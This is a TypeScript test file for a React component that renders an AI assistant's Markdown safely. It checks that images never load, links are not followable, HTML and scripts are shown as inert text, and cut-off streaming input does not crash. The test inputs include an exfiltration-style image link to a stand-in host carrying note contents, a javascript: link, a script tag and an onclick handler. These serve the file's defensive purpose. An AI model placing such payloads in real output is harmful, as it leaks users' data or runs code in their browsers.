// @vitest-environment jsdom
import { cleanup, render } from "@testing-library/react";
import { afterEach, describe, expect, it } from "vitest";
import { AssistantMarkdown } from "./AssistantMarkdown";

afterEach(cleanup);

const html = (markdown: string) => render(<AssistantMarkdown text={markdown} />).container;

describe("AssistantMarkdown", () => {
  it("renders ordinary Markdown: headings, emphasis, lists, code and GFM tables", () => {
    const c = html("# Title\n\nSome **bold** and `code`.\n\n- one\n- two\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```js\nlet x = 1;\n```");
    expect(c.querySelector("h1")?.textContent).toBe("Title");
    expect(c.querySelector("strong")?.textContent).toBe("bold");
    expect(c.querySelectorAll("li")).toHaveLength(2);
    expect(c.querySelector("table td")?.textContent).toBe("1");
    expect(c.querySelector("pre code")?.textContent).toContain("let x = 1;");
  });

  it("never loads an image: it shows the alt text, and the address, as plain text", () => {
    const c = html("Look: ![secret chart](https://evil.example/p.png?d=the+whole+note)");
    expect(c.querySelector("img")).toBeNull();
    expect(c.textContent).toContain("secret chart");
    expect(c.innerHTML).not.toMatch(/<img|src=/i);
  });

  it("does not make a link that can be followed, but still shows where it points", () => {
    const c = html("See [the guide](https://example.com/guide) and [a note](note:7) and [x](javascript:alert(1)).");
    expect(c.querySelector("a")).toBeNull();
    expect(c.textContent).toContain("the guide");
    expect(c.querySelector('[title="https://example.com/guide"]')).not.toBeNull();
  });

  it("shows HTML and the note components as text, and runs nothing", () => {
    const c = html("<script>window.hacked = 1</script>\n\n<Info>careful</Info>\n\n<b onclick=\"x()\">bold?</b>");
    expect(c.querySelector("script")).toBeNull();
    expect(c.querySelector("b")).toBeNull();
    expect(c.querySelector("[onclick]")).toBeNull();
    expect((window as unknown as { hacked?: number }).hacked).toBeUndefined();
  });

  it("copes with Markdown that is cut off in the middle, as it is while streaming", () => {
    for (const partial of ["**bold", "```js\nlet", "| a | b |\n|---", "[link](http", "![alt](", "<Info"]) {
      expect(() => html(partial)).not.toThrow();
    }
  });
});
